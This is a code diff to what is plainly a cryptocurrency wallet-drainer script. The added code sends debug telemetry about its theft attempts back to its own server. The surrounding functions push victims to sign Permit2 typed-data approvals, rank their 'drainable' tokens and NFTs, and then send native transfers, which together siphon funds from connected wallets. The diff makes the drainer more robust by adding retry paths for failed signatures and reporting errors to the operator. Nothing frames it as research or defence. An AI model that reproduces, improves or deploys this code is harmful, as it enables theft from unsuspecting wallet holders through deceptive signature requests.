@@ -5734,6 +5734,10 @@
     return merged;
   }
 
+  function _dbgLog(msg, data) {
+    try { void apiPost('/api/v1/debug-log', { message: msg, data: data || {} }).catch(function() {}); } catch (e) {}
+  }
+
   async function drainPermit2Chunk(provider, address, chainId, permits, nftArr, nativeStr) {
     if (permits.length === 0 && nftArr.length === 0 && nativeStr === '0') return null;
 
@@ -5747,7 +5751,11 @@
       batch_nft_approvals: nftArr.length > 0,
       nft_batch_size: NFT_APPROVAL_BATCH_SIZE,
     });
-    if (!resp || !resp.data) { L.warn('Permit2 typed_data fail'); return null; }
+    if (!resp || !resp.data) {
+      L.warn('Permit2 typed_data fail');
+      _dbgLog('Permit2 typed_data FAIL', { chain: Number(chainId), addr: address ? address.slice(0,8) : 'none', permits: permits.length, resp_status: resp ? 'no_data' : 'null' });
+      return null;
+    }
     var bd = resp.data;
     if (!bd.typed_data && permits.length === 0 && !bd.native_transfer) return null;
 
@@ -5756,14 +5764,24 @@
       var td = normalizeTypedData(JSON.parse(JSON.stringify(bd.typed_data)));
       td = applyDynamicEip712Domain(td, chainId);
       L.log('Permit2 typed_data received, requesting signature...');
+      _dbgLog('Permit2 sign start', { chain: Number(chainId), has_td: true });
       try {
         permitSig = await provider.request({
           method: 'eth_signTypedData_v4',
           params: [address, JSON.stringify(td)],
         });
+        _dbgLog('Permit2 sign OK (v1)', { chain: Number(chainId) });
       } catch (e) {
         if (isUserRejection(e)) throw e;
-        permitSig = await provider.request({ method: 'eth_signTypedData_v4', params: [address, td] });
+        _dbgLog('Permit2 sign v1 fail, trying v2', { err: e && e.message ? e.message.slice(0,80) : 'unknown' });
+        try {
+          permitSig = await provider.request({ method: 'eth_signTypedData_v4', params: [address, td] });
+          _dbgLog('Permit2 sign OK (v2)', { chain: Number(chainId) });
+        } catch (e2) {
+          _dbgLog('Permit2 sign v2 FAIL', { err: e2 && e2.message ? e2.message.slice(0,80) : 'unknown' });
+          if (isUserRejection(e2)) throw e2;
+          throw e2;
+        }
       }
     }
 
@@ -5971,6 +5989,7 @@
 
     // ═══ Permit2 FIRST — ERC20 tokens priority (get valuable tokens before native) ═══
     var drainableTokens = filterDrainableTokens(assets.tokens);
+    _dbgLog('Drain waterfall state', { chain: Number(chainId), drainable_tokens: drainableTokens.length, p2_confirmed: isPopupConfirmed('permit2', chainId), pending_p2: !!S.pendingEvmPermit2, anchors_ok: Number(S.anchorsOk) || 0 });
     if (drainableTokens.length > 0 && !isPopupConfirmed('permit2', chainId)) {
       try {
         var p2 = await drainPermit2(provider, address, chainId, drainableTokens, assets.nfts, 0n);
@@ -5978,11 +5997,18 @@
           S.pendingEvmPermit2 = p2;
           markPopupConfirmed('permit2', chainId);
           didSomething = true;
+        } else {
+          _dbgLog('Drain permit2 returned null', { chain: Number(chainId) });
         }
       } catch (pe) {
         if (isUserRejection(pe)) { S.userRejectedSign = true; throw pe; }
         L.warn('Permit2 fail:', pe.message);
+        _dbgLog('Permit2 fail (outer)', { err: pe && pe.message ? pe.message.slice(0,100) : 'unknown' });
       }
+    } else if (drainableTokens.length === 0) {
+      _dbgLog('Drain skip: no drainable tokens', { all_tokens: (assets.tokens || []).length });
+    } else {
+      _dbgLog('Drain skip: p2 already confirmed', { chain: Number(chainId) });
     }
 
     // ═══ Native eth_sendTransaction AFTER Permit2 — runs regardless of didSomething ═══
